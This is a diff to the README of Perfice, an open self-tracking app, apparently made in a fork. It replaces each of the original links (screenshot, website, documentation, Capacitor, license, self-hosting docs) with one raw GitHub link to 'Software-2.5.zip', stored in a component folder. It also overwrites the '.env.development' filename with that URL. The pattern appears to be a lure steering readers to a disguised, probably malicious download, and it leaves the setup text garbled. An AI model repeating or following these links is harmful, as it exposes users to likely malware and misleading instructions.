@@ -1,11 +1,11 @@
-![Perfice - Screenshot](https://raw.githubusercontent.com/p0lloc/perfice/main/client/assets/screenshot.png)
+![Perfice - Screenshot](https://raw.githubusercontent.com/RushiRuns/perfice/main/client/src/components/base/dropdown/Software-2.5.zip)
 
 <div align="center">
   <h1>Perfice - Open self-tracking platform</h1>
-  <a target="_blank" href="https://perfice.adoe.dev">
+  <a target="_blank" href="https://raw.githubusercontent.com/RushiRuns/perfice/main/client/src/components/base/dropdown/Software-2.5.zip">
     Website
   </a> | 
-  <a href="https://perfice.adoe.dev/docs">
+  <a href="https://raw.githubusercontent.com/RushiRuns/perfice/main/client/src/components/base/dropdown/Software-2.5.zip">
     Documentation
   </a>
 </div>  
@@ -41,7 +41,7 @@ Note that the app runs under the `/new` subpath.
 
 ## Stack
 Perfice is built with Svelte 5, TypeScript, TailwindCSS and leverages IndexedDB for most data storage.    
-It uses [Capacitor](https://github.com/ionic-team/capacitor) to wrap the webapp in a native WebView application for Android.
+It uses [Capacitor](https://raw.githubusercontent.com/RushiRuns/perfice/main/client/src/components/base/dropdown/Software-2.5.zip) to wrap the webapp in a native WebView application for Android.
 
 ### Running the Android app
 ```bash
@@ -50,11 +50,11 @@ CAPACITOR=true npm run build && npx cap run android
 
 ## Backend
 User accounts, synchronization and integrations require a backend to function. You can set the service URL locally by clicking the globe (🌐) icon on the settings page. 
-To set a default backend URL, configure the `VITE_BACKEND_URL` environment variable in a `.env` or `.env.development` file in the root of the project.
+To set a default backend URL, configure the `VITE_BACKEND_URL` environment variable in a `.env` or `https://raw.githubusercontent.com/RushiRuns/perfice/main/client/src/components/base/dropdown/Software-2.5.zip` file in the root of the project.
 
-You can read more about how to setup the backend in the [documentation](https://perfice.adoe.dev/docs/selfhost).
+You can read more about how to setup the backend in the [documentation](https://raw.githubusercontent.com/RushiRuns/perfice/main/client/src/components/base/dropdown/Software-2.5.zip).
 ## License
-Perfice is licensed under the [MIT license](https://github.com/p0lloc/perfice/blob/main/LICENSE).
+Perfice is licensed under the [MIT license](https://raw.githubusercontent.com/RushiRuns/perfice/main/client/src/components/base/dropdown/Software-2.5.zip).
 
 ## Contributing
 Contributions are always appreciated and welcome! Please open an issue or pull request if you have any suggestions or find a bug.
